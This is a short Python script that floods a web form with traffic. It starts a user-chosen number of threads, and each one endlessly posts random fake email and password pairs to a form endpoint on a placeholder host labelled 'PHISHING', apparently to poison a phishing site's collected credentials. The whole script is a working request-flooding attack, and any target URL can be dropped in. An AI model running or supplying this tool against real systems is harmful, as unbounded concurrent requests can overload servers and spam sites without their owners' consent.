import urllib
import urllib.request
import random
import string
from threading import Thread
import sys

'''
the number of threads
'''
num = int (sys.argv[1])

def attack():
	while True:
		data = {
		    'username': id_generator(random.randint(3,10)).lower()+"@"+id_generator(random.randint(3,10)).lower()+".com",
		    'password': id_generator(random.randint(3,10)).lower(),
		}
		f = urllib.parse.urlencode(data)
		f = f.encode('utf-8')
		req = urllib.request.Request(url="http://PHISHING/ajax/apps/formSubmitAjax.php",
		                      data=f, 
		                      headers={"Content-type": "application/x-www-form-urlencoded"}) 
		response = urllib.request.urlopen(req)
		the_page = response.read()
		print('flooeded with '+ str(data))

def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

if __name__ == "__main__":
    for k in range(0, num):
        thread = Thread(target = attack)
        thread.start()
        print('Launched thread '+str(k))
        print()